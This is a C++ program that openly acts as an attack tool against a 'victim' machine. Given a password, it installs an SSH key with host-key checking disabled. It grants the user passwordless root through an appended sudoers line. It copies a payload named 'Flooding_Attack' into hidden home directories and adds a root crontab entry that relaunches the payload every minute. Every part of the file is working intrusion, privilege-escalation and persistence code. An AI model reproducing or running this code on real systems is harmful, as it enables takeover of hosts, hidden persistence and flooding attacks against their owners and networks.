#include <iostream>
#include <string>
#include <cstdlib> // system()

int cmd(const std::string& s){
    return system(s.c_str());
}

int configure_victim_ssh(const std::string& remote, const std::string& password){
    // Generate rsa key if it doesn't exist
    cmd(
        "find ~/.ssh/id_rsa > /dev/null || "
        "ssh-keygen -t rsa -N \"\" -f ~/.ssh/id_rsa > /dev/null"
    );
    // Send key with ssh-copy-id
    return cmd(
               "sshpass -p " + password +
               " ssh-copy-id -i ~/.ssh/id_rsa.pub -o StrictHostKeyChecking=no " + remote +
               " > /dev/null"
    );
}

int main(int argc, char** argv) {
    if(argc < 3){
        std::cout << "Usage: " << argv[0] << " <ip> <username> [password]\n";
        return -1;
    }

    std::string username    = std::string(argv[2]);
    std::string remote      = username + "@" + std::string(argv[1]); // username@ip
    if(argc == 3){
        std::cout << "Assume passwordless SSH login is established.\n";
    }else{
        std::string password = argv[3];
        // Configure ssh
        std::cout << "Attempting to establishing passwordless SSH login with victim.\n";
        int status = configure_victim_ssh(remote, password);
        std::cout << (status == 0 ? "Passwordless SSH login established.\n" :
                                    "Unable to establish passwordless SSH login.\n");
        // Give sudoers permission
        std::cout << "Giving victim permission to do passwordless sudo.\n";
        cmd(
            "sshpass -p " + password +
            " ssh -o StrictHostKeyChecking=no " + remote +
            " \'echo \"" + username + " ALL=(ALL) NOPASSWD: ALL\" | "
            "{ echo \"" + password + "\"; cat -; } | "
            "sudo -k -S EDITOR=\"tee -a\" visudo\' > /dev/null"
        );
    }

    std::string ssh_pre = "ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no " + remote;
    std::string payload = "Flooding_Attack";
    std::string h1 = "/home/" + username + "/.etc/.module/";
    std::string h2 = "/home/" + username + "/.asdf/.module/";
    int status = 0;

    // Send payload to h2
    cmd(ssh_pre + " \'mkdir -p " + h2 + "\'");
    status = cmd("scp -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no Flooding_Attack " + remote + ":" + h2 + " > /dev/null");
    std::cout << "Sending payload to " << h2 << ": " << (status == 0 ? "Success\n" : "Failed\n");

    // Copy payload from h2 to h1
    cmd(ssh_pre + " \'mkdir -p " + h1 + "\'");
    status = cmd(ssh_pre + " \'sudo cp " + h2 + payload + " " + h1 + "\' > /dev/null");
    std::cout << "Sending payload to " << h1 << ": " << (status == 0 ? "Success\n" : "Failed\n");

    // Modify crontab
    std::string crontabtext = "* * * * * root pgrep Flooding_Attack > /dev/null || (" + h1 + payload + ") || (" + h2 + payload + ")";
    status = cmd(ssh_pre + " \'echo \"" + crontabtext + "\" | sudo tee -a /etc/crontab\' > /dev/null");
    std::cout << "Modifying crontab : " << (status == 0 ? "Success\n" : "Failed\n");

    return 0;
}
